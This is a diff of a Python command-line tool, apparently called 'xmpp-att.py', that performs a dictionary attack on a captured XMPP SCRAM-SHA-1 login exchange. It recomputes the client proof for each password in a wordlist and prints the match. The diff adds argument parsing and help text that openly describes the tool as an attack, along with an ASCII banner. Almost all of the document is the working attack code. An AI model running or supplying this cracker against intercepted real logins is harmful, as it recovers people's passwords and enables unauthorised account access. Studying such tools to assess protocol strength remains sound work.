@@ -2,6 +2,9 @@ import hashlib
 import hmac
 import base64
 from pathlib import Path
+import art
+import sys
+from rich import print as rprint
 
 def salted_sha1_PBKDF2(password, salt, rounds):
     # Appliquer PBKDF2-SHA-1
@@ -69,15 +72,57 @@ def xmpp(username, password, client_nonce, intial_message, server_challenge, sal
 
     return client_final_message
 
+def help():
+    rprint("[bold]Usage : python3 xmpp-att.py -i VALUE -s VALUE -c VALUE -w PATH[/bold]")
+    rprint("Performs a dictionnary attack against an XMPP exchange between the server and the user.")
+    rprint("")
+    rprint("    [yellow]-h[/yellow]     display this help and exit")
+    rprint("    [yellow]-i VALUE[/yellow]    replace VALUE with the value of the intial message sent by the client (ex: [deep_sky_blue1]-i n,,n=user,r=fyko+d2lbbFgONRv9qkxdawL[/deep_sky_blue1])")
+    rprint("    [yellow]-s VALUE[/yellow]    replace VALUE with the value of the server's message (ex: [deep_sky_blue1]-s r=fyko+d2lbbFgONRv9qkxdawL3rfcNHYJY1ZVvWVs7j,s=QSXCR+Q6sek8bf92,i=4096[/deep_sky_blue1])")
+    rprint("    [yellow]-c VALUE[/yellow]    replace VALUE with the value of the client's final message sent by the client (ex: [deep_sky_blue1]-c c=biws,r=fyko+d2lbbFgONRv9qkxdawL3rfcNHYJY1ZVvWVs7j,p=v0X8v3Bz2T0CJGbJQyF0X+HI4Ts=[/deep_sky_blue1])")
+    rprint("    [yellow]-w PATH[/yellow]     replace PATH with the path to a wordlist (ex: [deep_sky_blue1]-w ~/files/wordlist/small_wordlist.txt[/deep_sky_blue1])")
+
+    sys.exit(1)
+
 #User input
-#password = "pencil"
-initial_message = "n,,n=user,r=fyko+d2lbbFgONRv9qkxdawL"
-server_challenge = "r=fyko+d2lbbFgONRv9qkxdawL3rfcNHYJY1ZVvWVs7j,s=QSXCR+Q6sek8bf92,i=4096"
-client_final_message = "c=biws,r=fyko+d2lbbFgONRv9qkxdawL3rfcNHYJY1ZVvWVs7j,p=v0X8v3Bz2T0CJGbJQyF0X+HI4Ts="
+art.tprint("XMPP ATT",font="bulbhead")
 
-wordlist = "~/files/wordlist/small_wordlist.txt"
+initial_message, server_challenge, client_final_message, wordlist = "", "", "", ""
 
-wordlist = wordlist.replace("~", str(Path.home()))
+if "-h" in sys.argv:
+    help()
+
+try:
+    initial_message = sys.argv[sys.argv.index("-i") + 1]
+except:
+    rprint("[red bold]Missing value for -i[/red bold]")
+    help()
+
+try:
+    server_challenge = sys.argv[sys.argv.index("-s") + 1]
+except:
+    rprint("[red bold]Missing value for -s[/red bold]")
+    help()
+
+try:
+    client_final_message = sys.argv[sys.argv.index("-c") + 1]
+except:
+    rprint("[red bold]Missing value for -c[/red bold]")
+    help()
+
+try:
+    wordlist = sys.argv[sys.argv.index("-w") + 1]
+    wordlist = wordlist.replace("~", str(Path.home()))
+except:
+    rprint("[red bold]Missing path for -w[/red bold]")
+    help()
+
+if len(sys.argv) < 9:
+    rprint("[red bold]Not enough arguments[/red bold]")
+    help()
+if len(sys.argv) > 9:
+    rprint("[red bold]Too much arguments[/red bold]")
+    help()
 
 w = open(wordlist,"r")
 
@@ -113,9 +158,10 @@ while server_challenge[k] != "=":
     k-=1
 rounds=int(server_challenge[s_rounds_start:])
 
-#call to the xmpp function
+#start the attack
 for word in w:
     password = word.replace("\n","")
     res = xmpp(username, password, client_nonce, initial_message, server_challenge, salt_b64, rounds)
     if res == client_final_message:
-        print("Mot de passe trouvé:",password)
+        rprint("[green bold] FOUND PASSWORD :[/green bold]",password)
+        sys.exit(1)
